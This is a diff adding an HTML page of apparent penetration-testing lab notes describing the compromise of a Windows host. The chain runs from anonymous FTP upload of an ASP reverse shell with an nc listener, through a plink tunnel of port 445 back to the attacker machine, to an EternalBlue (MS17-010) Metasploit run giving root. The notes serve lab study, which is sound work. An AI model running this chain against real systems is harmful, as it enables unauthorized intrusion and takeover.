@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>13,14 Bob</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>13,14 Bob</h1><br/>nmap showed that 21, 80, 3389 were all open<br />21 allowed ftp annonymous login... and we are in!!<br />I navigated to wwwroot and saw that I could upload files with put<br />used msf to make an asp shellcode (I knew asp because there was a .asp file already in there)<br />bi          to upload as binary<br />put shell.asp<br />started nc listener<br />navigated to 10.11.1.13/shell.asp<br />boom!! shell<br /><br />PRIVESC<br />ran systeminfo, copied results into 13.txt (on kali)<br />ran ./wes.py 13.txt and saw that the machine was vulnerable to CVE: CVE-2017-0143 KB: KB4012598 otherwise known as MS17-010 or eternal blue!!<br />445 was closed to the kali, so I used plink to tunnel the 445 traffic to myself<br />put plink (with ftp)<br />cd to wwwroot dir<br />plink -R 445:localhost:445 root@10.11.0.186      to <strong>forward 445</strong> traffic on the <strong>localhost </strong>to <strong>open</strong> 445 to <strong>10.11.0.186</strong>   <br />nmap -p 445 10.11.1.13    to verify we can hit 445... open.... boom!!<br /><br />used metasploit to finish<br />use exploit/windows/smb/ms17_010_psexec<br />set dbgtrace true<br />set verbose true<br />set rhost 127.0.0.1<br />set lhost 10.11.0.186<br />set lport 4444<br />run...<br />rooted</div></body></html>
